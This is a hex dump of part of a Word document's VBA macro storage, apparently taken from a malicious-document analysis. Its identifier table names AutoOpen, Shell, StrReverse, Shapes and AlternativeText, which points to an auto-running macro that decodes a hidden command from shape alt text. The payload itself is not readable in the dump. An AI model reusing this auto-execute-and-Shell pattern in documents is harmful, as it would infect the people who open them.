00013180: 5000 5200 4f00 4a00 4500 4300 5400 0000  P.R.O.J.E.C.T...
00013190: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000131a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000131b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000131c0: 1000 0201 0600 0000 1000 0000 ffff ffff  ................
000131d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000131e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000131f0: 0000 0000 aa00 0000 cd01 0000 0000 0000  ................
00013200: ffff ffff ffff ffff ffff 0000 0000 1000  ................
00013210: 0000 0800 3800 f100 0000 0000 0000 0000  ....8...........
00013220: 0200 0000 0060 0000 fdff ffff ffff ffff  .....`..........
00013230: ffff ffff ffff ffff ffff ffff 0000 0000  ................
00013240: 0000 0000 0000 0000 0000 0000 6200 0000  ............b...
00013250: 0000 007f 0000 0000 0000 0000 0000 0000  ................
00013260: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013270: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013280: 0116 0300 01f0 0000 00bc 0200 00d4 0000  ................
00013290: 00da 0100 00ff ffff ffc3 0200 0023 0300  .............#..
000132a0: 0000 0000 0001 0000 007e 8fac e500 00ff  .........~......
000132b0: ffa3 0000 0088 0000 00b6 00ff ff01 0100  ................
000132c0: 0000 00ff ffff ff00 0000 00ff ffff ffff  ................
000132d0: ff00 0000 0000 0000 0000 0000 0000 0000  ................
000132e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000132f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013300: 0000 0000 0000 0010 0000 0003 0000 0005  ................
00013310: 0000 0007 0000 00ff ffff ffff ffff ff01  ................
00013320: 0108 0000 00ff ffff ff78 0000 0008 0000  .........x......
00013330: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013340: 0000 0000 0000 0000 0000 0000 0000 ffff  ................
00013350: 0000 0000 4d45 0000 ffff ffff ffff 0000  ....ME..........
00013360: 0000 ffff 0000 0000 ffff 0101 0000 0000  ................
00013370: df00 ffff 0000 0000 1800 ffff ffff ffff  ................
00013380: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00013390: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000133a0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000133b0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000133c0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000133d0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000133e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000133f0: ffff ffff ffff ffff ffff 2800 0000 0200  ..........(.....
00013400: 5322 ffff ffff 0000 0100 5310 ffff ffff  S"........S.....
00013410: 0000 0100 5322 ffff ffff 0000 0000 023c  ....S".........<
00013420: ffff ffff 0000 ffff 0101 0000 0000 0100  ................
00013430: 2800 3100 4e00 6f00 7200 6d00 6100 6c00  (.1.N.o.r.m.a.l.
00013440: 2e00 5400 6800 6900 7300 4400 6f00 6300  ..T.h.i.s.D.o.c.
00013450: 7500 6d00 6500 6e00 7400 0800 0000 0000  u.m.e.n.t.......
00013460: ffff ffff 0101 5000 0000 0280 feff ffff  ......P.........
00013470: ffff 2000 0000 ffff ffff 3000 0000 0201  .. .......0.....
00013480: ffff 0000 0000 0000 0000 ffff ffff ffff  ................
00013490: ffff 0000 0000 0000 0000 1d00 0000 2500  ..............%.
000134a0: 0000 ffff ffff 4000 0000 ffff ffff 3800  ......@.......8.
000134b0: 0000 ffff ffff 3000 0000 0000 0000 0000  ......0.........
000134c0: 0100 0000 0000 0000 0000 ffff ffff ffff  ................
000134d0: ffff ffff ffff 0000 0000 ffff ffff ffff  ................
000134e0: ffff ffff ffff ffff ffff ffff ffff 0000  ................
000134f0: 0000 ffff ffff ffff ffff ffff ffff ffff  ................
00013500: ffff ffff ffff 0000 0000 0000 0000 ffff  ................
00013510: 0000 ffff ffff ffff 0000 0000 ffff ffff  ................
00013520: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00013530: ffff ffff 0000 0100 4000 0000 5ac8 b764  ........@...Z..d
00013540: 0a00 df01 0000 0000 0000 0000 0000 0000  ................
00013550: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013560: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013570: 0000 0000 0000 0000 0000 0000 0000 00fe  ................
00013580: ca01 0001 0000 8009 0000 0000 00ff ffff  ................
00013590: ffff ffff ff01 0108 0000 00ff ffff ff78  ...............x
000135a0: 0000 00ff ffff ff00 0001 9bb0 0041 7474  .............Att
000135b0: 7269 6275 7400 6520 5642 5f4e 616d 0065  ribut.e VB_Nam.e
000135c0: 203d 2022 5468 6900 7344 6f63 756d 656e   = "Thi.sDocumen
000135d0: 1074 220d 0a0a 8c42 6173 0102 8c31 4e6f  .t"....Bas...1No
000135e0: 726d 616c 022e 1956 476c 6f62 616c 2101  rmal...VGlobal!.
000135f0: aa53 7061 6301 6c46 6108 6c73 650c a243  .Spac.lFa.lse..C
00013600: 7265 6110 7461 626c 151f 5072 6520 6465  rea.tabl..Pre de
00013610: 636c 6100 0649 6411 009e 5472 750d 4245  cla..Id...Tru.BE
00013620: 7870 086f 7365 141c 5465 6d70 006c 6174  xp.ose..Temp.lat
00013630: 6544 6572 6902 7615 2443 7573 746f 6d0c  eDeri.v.$Custom.
00013640: 697a 8443 8331 0d0a 0000 0000 0000 0000  iz.C.1..........
00013650: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013660: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013670: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013680: 4944 3d22 7b41 4546 3743 4539 462d 4436  ID="{AEF7CE9F-D6
00013690: 4445 2d34 3132 322d 3835 4635 2d38 4446  DE-4122-85F5-8DF
000136a0: 4639 4331 4345 3938 467d 220d 0a44 6f63  F9C1CE98F}"..Doc
000136b0: 756d 656e 743d 5468 6973 446f 6375 6d65  ument=ThisDocume
000136c0: 6e74 2f26 4830 3030 3030 3030 300d 0a50  nt/&H00000000..P
000136d0: 6163 6b61 6765 3d7b 4143 3946 3246 3930  ackage={AC9F2F90
000136e0: 2d45 3837 372d 3131 4345 2d39 4636 382d  -E877-11CE-9F68-
000136f0: 3030 4141 3030 3537 3441 3446 7d0d 0a4d  00AA00574A4F}..M
00013700: 6f64 756c 653d 6278 680d 0a4e 616d 653d  odule=bxh..Name=
00013710: 2250 726f 6a65 6374 220d 0a48 656c 7043  "Project"..HelpC
00013720: 6f6e 7465 7874 4944 3d22 3022 0d0a 5665  ontextID="0"..Ve
00013730: 7273 696f 6e43 6f6d 7061 7469 626c 6533  rsionCompatible3
00013740: 323d 2233 3933 3232 3230 3030 220d 0a43  2="393222000"..C
00013750: 4d47 3d22 3834 3836 4441 3139 3241 3132  MG="8486DA192A12
00013760: 3245 3132 3245 3132 3245 3132 3245 220d  2E122E122E122E".
00013770: 0a44 5042 3d22 3831 3833 4446 4530 4530  .DPB="8183DFE0E0
00013780: 4530 4530 4530 220d 0a47 433d 2237 4537  E0E0E0"..GC="7E7
00013790: 4332 3032 3745 3044 3944 4344 4144 4344  C2027E0D9DCDADCD
000137a0: 4132 3322 0d0a 0d0a 5b48 6f73 7420 4578  A23"....[Host Ex
000137b0: 7465 6e64 6572 2049 6e66 6f5d 0d0a 2648  tender Info]..&H
000137c0: 3030 3030 3030 3031 3d7b 3338 3332 4436  00000001={3832D6
000137d0: 3430 2d43 4639 302d 3131 4346 2d38 4534  40-CF90-11CF-8E4
000137e0: 332d 3030 4130 4339 3131 3030 3541 7d3b  3-00A0C911005A};
000137f0: 5642 453b 2648 3030 3030 3030 3030 0d0a  VBE;&H00000000..
00013800: cc61 b500 0003 00ff 0904 0000 0904 0000  .a..............
00013810: e404 0300 0000 0000 0000 0000 0100 0900  ................
00013820: 0200 2001 2a00 5c00 4700 7b00 3000 3000  .. .*.\.G.{.0.0.
00013830: 3000 3200 3000 3400 4500 4600 2d00 3000  0.2.0.4.E.F.-.0.
00013840: 3000 3000 3000 2d00 3000 3000 3000 3000  0.0.0.-.0.0.0.0.
00013850: 2d00 4300 3000 3000 3000 2d00 3000 3000  -.C.0.0.0.-.0.0.
00013860: 3000 3000 3000 3000 3000 3000 3000 3000  0.0.0.0.0.0.0.0.
00013870: 3400 3600 7d00 2300 3400 2e00 3200 2300  4.6.}.#.4...2.#.
00013880: 3900 2300 4300 3a00 5c00 5000 7200 6f00  9.#.C.:.\.P.r.o.
00013890: 6700 7200 6100 6d00 2000 4600 6900 6c00  g.r.a.m. .F.i.l.
000138a0: 6500 7300 5c00 4300 6f00 6d00 6d00 6f00  e.s.\.C.o.m.m.o.
000138b0: 6e00 2000 4600 6900 6c00 6500 7300 5c00  n. .F.i.l.e.s.\.
000138c0: 4d00 6900 6300 7200 6f00 7300 6f00 6600  M.i.c.r.o.s.o.f.
000138d0: 7400 2000 5300 6800 6100 7200 6500 6400  t. .S.h.a.r.e.d.
000138e0: 5c00 5600 4200 4100 5c00 5600 4200 4100  \.V.B.A.\.V.B.A.
000138f0: 3700 2e00 3100 5c00 5600 4200 4500 3700  7...1.\.V.B.E.7.
00013900: 2e00 4400 4c00 4c00 2300 5600 6900 7300  ..D.L.L.#.V.i.s.
00013910: 7500 6100 6c00 2000 4200 6100 7300 6900  u.a.l. .B.a.s.i.
00013920: 6300 2000 4600 6f00 7200 2000 4100 7000  c. .F.o.r. .A.p.
00013930: 7000 6c00 6900 6300 6100 7400 6900 6f00  p.l.i.c.a.t.i.o.
00013940: 6e00 7300 0000 0000 0000 0000 0000 0000  n.s.............
00013950: 1a01 2a00 5c00 4700 7b00 3000 3000 3000  ..*.\.G.{.0.0.0.
00013960: 3200 3000 3900 3000 3500 2d00 3000 3000  2.0.9.0.5.-.0.0.
00013970: 3000 3000 2d00 3000 3000 3000 3000 2d00  0.0.-.0.0.0.0.-.
00013980: 4300 3000 3000 3000 2d00 3000 3000 3000  C.0.0.0.-.0.0.0.
00013990: 3000 3000 3000 3000 3000 3000 3000 3400  0.0.0.0.0.0.0.4.
000139a0: 3600 7d00 2300 3800 2e00 3700 2300 3000  6.}.#.8...7.#.0.
000139b0: 2300 4300 3a00 5c00 5000 7200 6f00 6700  #.C.:.\.P.r.o.g.
000139c0: 7200 6100 6d00 2000 4600 6900 6c00 6500  r.a.m. .F.i.l.e.
000139d0: 7300 5c00 4d00 6900 6300 7200 6f00 7300  s.\.M.i.c.r.o.s.
000139e0: 6f00 6600 7400 2000 4f00 6600 6600 6900  o.f.t. .O.f.f.i.
000139f0: 6300 6500 5c00 7200 6f00 6f00 7400 5c00  c.e.\.r.o.o.t.\.
00013a00: 4f00 6600 6600 6900 6300 6500 3100 3600  O.f.f.i.c.e.1.6.
00013a10: 5c00 4d00 5300 5700 4f00 5200 4400 2e00  \.M.S.W.O.R.D...
00013a20: 4f00 4c00 4200 2300 4d00 6900 6300 7200  O.L.B.#.M.i.c.r.
00013a30: 6f00 7300 6f00 6600 7400 2000 5700 6f00  o.s.o.f.t. .W.o.
00013a40: 7200 6400 2000 3100 3600 2e00 3000 2000  r.d. .1.6...0. .
00013a50: 4f00 6200 6a00 6500 6300 7400 2000 4c00  O.b.j.e.c.t. .L.
00013a60: 6900 6200 7200 6100 7200 7900 0000 0000  i.b.r.a.r.y.....
00013a70: 0000 0000 0000 0000 bc00 2a00 5c00 4700  ..........*.\.G.
00013a80: 7b00 3000 3000 3000 3200 3000 3400 3300  {.0.0.0.2.0.4.3.
00013a90: 3000 2d00 3000 3000 3000 3000 2d00 3000  0.-.0.0.0.0.-.0.
00013aa0: 3000 3000 3000 2d00 4300 3000 3000 3000  0.0.0.-.C.0.0.0.
00013ab0: 2d00 3000 3000 3000 3000 3000 3000 3000  -.0.0.0.0.0.0.0.
00013ac0: 3000 3000 3000 3400 3600 7d00 2300 3200  0.0.0.4.6.}.#.2.
00013ad0: 2e00 3000 2300 3000 2300 4300 3a00 5c00  ..0.#.0.#.C.:.\.
00013ae0: 5700 6900 6e00 6400 6f00 7700 7300 5c00  W.i.n.d.o.w.s.\.
00013af0: 5300 7900 7300 7400 6500 6d00 3300 3200  S.y.s.t.e.m.3.2.
00013b00: 5c00 7300 7400 6400 6f00 6c00 6500 3200  \.s.t.d.o.l.e.2.
00013b10: 2e00 7400 6c00 6200 2300 4f00 4c00 4500  ..t.l.b.#.O.L.E.
00013b20: 2000 4100 7500 7400 6f00 6d00 6100 7400   .A.u.t.o.m.a.t.
00013b30: 6900 6f00 6e00 0000 0000 0000 0000 0000  i.o.n...........
00013b40: 0000 1200 2a00 5c00 4300 4e00 6f00 7200  ....*.\.C.N.o.r.
00013b50: 6d00 6100 6c00 1200 2a00 5c00 4300 4e00  m.a.l...*.\.C.N.
00013b60: 6f00 7200 6d00 6100 6c00 46c8 b764 0500  o.r.m.a.l.F..d..
00013b70: 0000 0000 0000 2801 2a00 5c00 4700 7b00  ......(.*.\.G.{.
00013b80: 3200 4400 4600 3800 4400 3000 3400 4300  2.D.F.8.D.0.4.C.
00013b90: 2d00 3500 4200 4600 4100 2d00 3100 3000  -.5.B.F.A.-.1.0.
00013ba0: 3100 4200 2d00 4200 4400 4500 3500 2d00  1.B.-.B.D.E.5.-.
00013bb0: 3000 3000 4100 4100 3000 3000 3400 3400  0.0.A.A.0.0.4.4.
00013bc0: 4400 4500 3500 3200 7d00 2300 3200 2e00  D.E.5.2.}.#.2...
00013bd0: 3800 2300 3000 2300 4300 3a00 5c00 5000  8.#.0.#.C.:.\.P.
00013be0: 7200 6f00 6700 7200 6100 6d00 2000 4600  r.o.g.r.a.m. .F.
00013bf0: 6900 6c00 6500 7300 5c00 4300 6f00 6d00  i.l.e.s.\.C.o.m.
00013c00: 6d00 6f00 6e00 2000 4600 6900 6c00 6500  m.o.n. .F.i.l.e.
00013c10: 7300 5c00 4d00 6900 6300 7200 6f00 7300  s.\.M.i.c.r.o.s.
00013c20: 6f00 6600 7400 2000 5300 6800 6100 7200  o.f.t. .S.h.a.r.
00013c30: 6500 6400 5c00 4f00 4600 4600 4900 4300  e.d.\.O.F.F.I.C.
00013c40: 4500 3100 3600 5c00 4d00 5300 4f00 2e00  E.1.6.\.M.S.O...
00013c50: 4400 4c00 4c00 2300 4d00 6900 6300 7200  D.L.L.#.M.i.c.r.
00013c60: 6f00 7300 6f00 6600 7400 2000 4f00 6600  o.s.o.f.t. .O.f.
00013c70: 6600 6900 6300 6500 2000 3100 3600 2e00  f.i.c.e. .1.6...
00013c80: 3000 2000 4f00 6200 6a00 6500 6300 7400  0. .O.b.j.e.c.t.
00013c90: 2000 4c00 6900 6200 7200 6100 7200 7900   .L.i.b.r.a.r.y.
00013ca0: 0000 0000 0000 0000 0000 0000 de00 2a00  ..............*.
00013cb0: 5c00 4700 7b00 3000 4400 3400 3500 3200  \.G.{.0.D.4.5.2.
00013cc0: 4500 4500 3100 2d00 4500 3000 3800 4600  E.E.1.-.E.0.8.F.
00013cd0: 2d00 3100 3000 3100 4100 2d00 3800 3500  -.1.0.1.A.-.8.5.
00013ce0: 3200 4500 2d00 3000 3200 3600 3000 3800  2.E.-.0.2.6.0.8.
00013cf0: 4300 3400 4400 3000 4200 4200 3400 7d00  C.4.D.0.B.B.4.}.
00013d00: 2300 3200 2e00 3000 2300 3000 2300 4300  #.2...0.#.0.#.C.
00013d10: 3a00 5c00 5700 6900 6e00 6400 6f00 7700  :.\.W.i.n.d.o.w.
00013d20: 7300 5c00 7300 7900 7300 7400 6500 6d00  s.\.s.y.s.t.e.m.
00013d30: 3300 3200 5c00 4600 4d00 3200 3000 2e00  3.2.\.F.M.2.0...
00013d40: 4400 4c00 4c00 2300 4d00 6900 6300 7200  D.L.L.#.M.i.c.r.
00013d50: 6f00 7300 6f00 6600 7400 2000 4600 6f00  o.s.o.f.t. .F.o.
00013d60: 7200 6d00 7300 2000 3200 2e00 3000 2000  r.m.s. .2...0. .
00013d70: 4f00 6200 6a00 6500 6300 7400 2000 4c00  O.b.j.e.c.t. .L.
00013d80: 6900 6200 7200 6100 7200 7900 0000 0000  i.b.r.a.r.y.....
00013d90: 0000 0000 0000 0100 0601 2a00 5c00 4700  ..........*.\.G.
00013da0: 7b00 3600 4100 3900 4200 4500 4200 3800  {.6.A.9.B.E.B.8.
00013db0: 3100 2d00 4200 3100 3200 3300 2d00 3400  1.-.B.1.2.3.-.4.
00013dc0: 3100 3800 3000 2d00 4100 4500 3600 3400  1.8.0.-.A.E.6.4.
00013dd0: 2d00 4400 4200 4400 3500 3600 3500 3500  -.D.B.D.5.6.5.5.
00013de0: 4200 3500 4200 3900 4300 7d00 2300 3200  B.5.B.9.C.}.#.2.
00013df0: 2e00 3000 2300 3000 2300 4300 3a00 5c00  ..0.#.0.#.C.:.\.
00013e00: 5500 7300 6500 7200 7300 5c00 3000 7800  U.s.e.r.s.\.0.x.
00013e10: 6400 6600 5c00 4100 7000 7000 4400 6100  d.f.\.A.p.p.D.a.
00013e20: 7400 6100 5c00 4c00 6f00 6300 6100 6c00  t.a.\.L.o.c.a.l.
00013e30: 5c00 5400 6500 6d00 7000 5c00 5600 4200  \.T.e.m.p.\.V.B.
00013e40: 4500 5c00 4d00 5300 4600 6f00 7200 6d00  E.\.M.S.F.o.r.m.
00013e50: 7300 2e00 6500 7800 6400 2300 4d00 6900  s...e.x.d.#.M.i.
00013e60: 6300 7200 6f00 7300 6f00 6600 7400 2000  c.r.o.s.o.f.t. .
00013e70: 4600 6f00 7200 6d00 7300 2000 3200 2e00  F.o.r.m.s. .2...
00013e80: 3000 2000 4f00 6200 6a00 6500 6300 7400  0. .O.b.j.e.c.t.
00013e90: 2000 4c00 6900 6200 7200 6100 7200 7900   .L.i.b.r.a.r.y.
00013ea0: 0000 0000 0000 0000 0000 0100 0000 e12e  ................
00013eb0: 450d 8fe0 1a10 852e 0260 8c4d 0bb4 0000  E........`.M....
00013ec0: 1e01 2a00 5c00 4700 7b00 3200 4100 3700  ..*.\.G.{.2.A.7.
00013ed0: 3500 3100 3900 3600 4300 2d00 4400 3900  5.1.9.6.C.-.D.9.
00013ee0: 4500 4200 2d00 3400 3100 3200 3900 2d00  E.B.-.4.1.2.9.-.
00013ef0: 4200 3800 3000 3300 2d00 3900 3300 3100  B.8.0.3.-.9.3.1.
00013f00: 3300 3200 3700 4600 3700 3200 4400 3500  3.2.7.F.7.2.D.5.
00013f10: 4300 7d00 2300 3200 2e00 3800 2300 3000  C.}.#.2...8.#.0.
00013f20: 2300 4300 3a00 5c00 5000 7200 6f00 6700  #.C.:.\.P.r.o.g.
00013f30: 7200 6100 6d00 2000 4600 6900 6c00 6500  r.a.m. .F.i.l.e.
00013f40: 7300 5c00 4300 6f00 6d00 6d00 6f00 6e00  s.\.C.o.m.m.o.n.
00013f50: 2000 4600 6900 6c00 6500 7300 5c00 5300   .F.i.l.e.s.\.S.
00013f60: 7900 7300 7400 6500 6d00 5c00 6100 6400  y.s.t.e.m.\.a.d.
00013f70: 6f00 5c00 6d00 7300 6100 6400 6f00 3200  o.\.m.s.a.d.o.2.
00013f80: 3800 2e00 7400 6c00 6200 2300 4d00 6900  8...t.l.b.#.M.i.
00013f90: 6300 7200 6f00 7300 6f00 6600 7400 2000  c.r.o.s.o.f.t. .
00013fa0: 4100 6300 7400 6900 7600 6500 5800 2000  A.c.t.i.v.e.X. .
00013fb0: 4400 6100 7400 6100 2000 4f00 6200 6a00  D.a.t.a. .O.b.j.
00013fc0: 6500 6300 7400 7300 2000 3200 2e00 3800  e.c.t.s. .2...8.
00013fd0: 2000 4c00 6900 6200 7200 6100 7200 7900   .L.i.b.r.a.r.y.
00013fe0: 0000 0000 0000 0000 0000 0000 d400 2a00  ..............*.
00013ff0: 5c00 4700 7b00 3400 3200 3000 4200 3200  \.G.{.4.2.0.B.2.
00014000: 3800 3300 3000 2d00 4500 3700 3100 3800  8.3.0.-.E.7.1.8.
00014010: 2d00 3100 3100 4300 4600 2d00 3800 3900  -.1.1.C.F.-.8.9.
00014020: 3300 4400 2d00 3000 3000 4100 3000 4300  3.D.-.0.0.A.0.C.
00014030: 3900 3000 3500 3400 3200 3200 3800 7d00  9.0.5.4.2.2.8.}.
00014040: 2300 3100 2e00 3000 2300 3000 2300 4300  #.1...0.#.0.#.C.
00014050: 3a00 5c00 5700 6900 6e00 6400 6f00 7700  :.\.W.i.n.d.o.w.
00014060: 7300 5c00 5300 7900 7300 7400 6500 6d00  s.\.S.y.s.t.e.m.
00014070: 3300 3200 5c00 7300 6300 7200 7200 7500  3.2.\.s.c.r.r.u.
00014080: 6e00 2e00 6400 6c00 6c00 2300 4d00 6900  n...d.l.l.#.M.i.
00014090: 6300 7200 6f00 7300 6f00 6600 7400 2000  c.r.o.s.o.f.t. .
000140a0: 5300 6300 7200 6900 7000 7400 6900 6e00  S.c.r.i.p.t.i.n.
000140b0: 6700 2000 5200 7500 6e00 7400 6900 6d00  g. .R.u.n.t.i.m.
000140c0: 6500 0000 0000 0000 0000 0000 0000 c000  e...............
000140d0: 2a00 5c00 4700 7b00 3600 4200 4600 3500  *.\.G.{.6.B.F.5.
000140e0: 3200 4100 3500 3000 2d00 3300 3900 3400  2.A.5.0.-.3.9.4.
000140f0: 4100 2d00 3100 3100 4400 3300 2d00 4200  A.-.1.1.D.3.-.B.
00014100: 3100 3500 3300 2d00 3000 3000 4300 3000  1.5.3.-.0.0.C.0.
00014110: 3400 4600 3700 3900 4600 4100 4100 3600  4.F.7.9.F.A.A.6.
00014120: 7d00 2300 3100 2e00 3000 2300 3000 2300  }.#.1...0.#.0.#.
00014130: 4300 3a00 5c00 5700 6900 6e00 6400 6f00  C.:.\.W.i.n.d.o.
00014140: 7700 7300 5c00 7300 7900 7300 7400 6500  w.s.\.s.y.s.t.e.
00014150: 6d00 3300 3200 5c00 7700 6d00 7000 2e00  m.3.2.\.w.m.p...
00014160: 6400 6c00 6c00 2300 5700 6900 6e00 6400  d.l.l.#.W.i.n.d.
00014170: 6f00 7700 7300 2000 4d00 6500 6400 6900  o.w.s. .M.e.d.i.
00014180: 6100 2000 5000 6c00 6100 7900 6500 7200  a. .P.l.a.y.e.r.
00014190: 0000 0000 0000 0000 0000 0000 0200 0200  ................
000141a0: 0100 0600 1202 0000 1402 0100 1602 0100  ................
000141b0: 1802 0000 1a02 0100 1c02 0100 1e02 ffff  ................
000141c0: ffff ffff 0000 0000 0000 0000 5ac8 b764  ............Z..d
000141d0: 0a00 ffff ffff ffff ffff ffff ffff ffff  ................
000141e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000141f0: ffff ffff ffff ffff ffff 0000 ffff ffff  ................
00014200: ffff ffff ffff ffff ffff ffff ffff 0100  ................
00014210: ffff 0100 0000 0000 0000 0000 0000 0000  ................
00014220: 0000 0000 0000 7e8f 0200 1800 5400 6800  ......~.....T.h.
00014230: 6900 7300 4400 6f00 6300 7500 6d00 6500  i.s.D.o.c.u.m.e.
00014240: 6e00 7400 1400 3000 3100 3600 3400 6200  n.t...0.1.6.4.b.
00014250: 3700 6300 3800 3400 3600 ffff 2f02 1800  7.c.8.4.6.../...
00014260: 5400 6800 6900 7300 4400 6f00 6300 7500  T.h.i.s.D.o.c.u.
00014270: 6d00 6500 6e00 7400 ffff ace5 0000 0000  m.e.n.t.........
00014280: 0000 0002 0000 0029 0300 00ff ff06 0062  .......).......b
00014290: 0078 0068 0014 0030 0039 0036 0034 0062  .x.h...0.9.6.4.b
000142a0: 0037 0063 0038 0035 0061 00ff ff32 0206  .7.c.8.5.a...2..
000142b0: 0062 0078 0068 00ff fff2 d100 0000 0000  .b.x.h..........
000142c0: 0018 0200 0000 300a 0000 ffff ffff ffff  ......0.........
000142d0: 0101 3802 0000 ffff ffff ffff ffff ffff  ..8.............
000142e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000142f0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014300: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014310: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014320: ffff ffff ffff ffff ffff ffff ffff 1802  ................
00014330: 0000 ffff ffff ffff ffff ffff ffff ffff  ................
00014340: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014350: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014360: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014370: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014380: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014390: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000143a0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000143b0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000143c0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000143d0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000143e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000143f0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014400: ffff ffff ffff ffff ffff 0002 0000 ffff  ................
00014410: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014420: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014430: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014440: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014450: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014460: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014470: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014480: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014490: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000144a0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000144b0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000144c0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000144d0: ffff ffff ffff 3e0c 30d7 2116 fa4c a697  ......>.0.!..L..
000144e0: e380 f61f ab52 ffff ffff 0100 0000 80cc  .....R..........
000144f0: 5b62 6ae7 7b4f 85bc 0939 cd14 1d27 ffff  [bj.{O...9...'..
00014500: ffff 0100 0000 ffff ffff 4800 0000 8000  ..........H.....
00014510: 0000 0000 3901 3300 0601 0c31 0000 040c  ....9.3....1....
00014520: 576f 7264 b56b 1000 030c 5642 41f7 e210  Word.k....VBA...
00014530: 0005 0457 696e 3136 c17e 1000 0504 5769  ...Win16.~....Wi
00014540: 6e33 3207 7f10 0005 0457 696e 3634 787f  n32......Win64x.
00014550: 1000 0304 4d61 63b3 b210 0004 0456 4241  ....Mac......VBA
00014560: 36ad 2310 0004 0456 4241 37ae 2310 0007  6.#....VBA7.#...
00014570: 0c50 726f 6a65 6374 2dae 1000 0608 7374  .Project-.....st
00014580: 646f 6c65 9360 1000 0688 2000 ff03 0300  dole.`.... .....
00014590: 4e6f 726d 616c dfd8 1000 0688 2000 ff03  Normal...... ...
000145a0: 0300 4f66 6669 6365 1575 1000 0788 2000  ..Office.u.... .
000145b0: ff03 0300 4d53 466f 726d 7343 0f10 0005  ....MSFormsC....
000145c0: 8820 00ff 0303 0041 444f 4442 73b2 1000  . .....ADODBs...
000145d0: 0988 2000 ff03 0300 5363 7269 7074 696e  .. .....Scriptin
000145e0: 678a df10 0006 8820 00ff 0303 0057 4d50  g...... .....WMP
000145f0: 4c69 62fe da10 000c 0c54 6869 7344 6f63  Lib......ThisDoc
00014600: 756d 656e 743c 9e10 0009 8000 00ff 0303  ument<..........
00014610: 005f 4576 616c 7561 7465 18d9 1000 030c  ._Evaluate......
00014620: 6278 6838 7b10 0005 0465 4669 6c65 7a66  bxh8{....eFilezf
00014630: 1000 0304 5151 3155 ca10 000e 0041 6374  ....QQ1U.....Act
00014640: 6976 6544 6f63 756d 656e 74d3 5c10 0006  iveDocument.\...
00014650: 0053 6861 7065 73fb 3c10 0003 0451 5132  .Shapes.<....QQ2
00014660: 56ca 1000 0200 524f fe5e 1000 0a00 5374  V.....RO.^....St
00014670: 7252 6576 6572 7365 9f17 1000 0300 524f  rReverse......RO
00014680: 497c cf10 0002 0069 69ab 5d10 0002 004e  I|.....ii.]....N
00014690: 6560 5e10 0002 0057 5799 5f10 000f 0041  e`^....WW._....A
000146a0: 6c74 6572 6e61 7469 7665 5465 7874 9e62  lternativeText.b
000146b0: 1000 0600 4d79 4669 6c65 c1d5 1000 0300  ....MyFile......
000146c0: 6675 6e33 9010 0005 0053 6865 6c6c 56d7  fun3.....ShellV.
000146d0: 1000 0300 4368 724b 7e10 0008 0077 6169  ....ChrK~....wai
000146e0: 7454 696c 6ca9 d510 0003 004e 6f77 25ba  tTill......Now%.
000146f0: 1000 0900 5469 6d65 5661 6c75 65ba fc10  ....TimeValue...
00014700: 0006 004d 7367 426f 7897 5210 0008 ac28  ...MsgBox.R....(
00014710: 0101 0003 0041 7574 6f4f 7065 6ed9 2a10  .....AutoOpen.*.
00014720: 0008 8408 00ff 0301 0044 6f63 756d 656e  .........Documen
00014730: 746a d310 0004 0049 7465 6dd7 7a10 0009  tj.....Item.z...
00014740: 8000 00ff 0303 005f 425f 7661 725f 524f  ......._B_var_RO
00014750: a6f3 1000 0a80 0000 ff03 0300 5f42 5f76  ............_B_v
00014760: 6172 5f52 4f49 8d8c 1000 0980 0000 ff03  ar_ROI..........
00014770: 0300 5f42 5f76 6172 5f69 6953 f210 0009  .._B_var_iiS....
00014780: 8000 00ff 0303 005f 425f 7661 725f 4e65  ......._B_var_Ne
00014790: 08f3 1000 0980 0000 ff03 0300 5f42 5f76  ............_B_v
000147a0: 6172 5f57 5741 f410 000d 8000 00ff 0303  ar_WWA..........
000147b0: 005f 425f 7661 725f 4d79 4669 6c65 2b50  ._B_var_MyFile+P
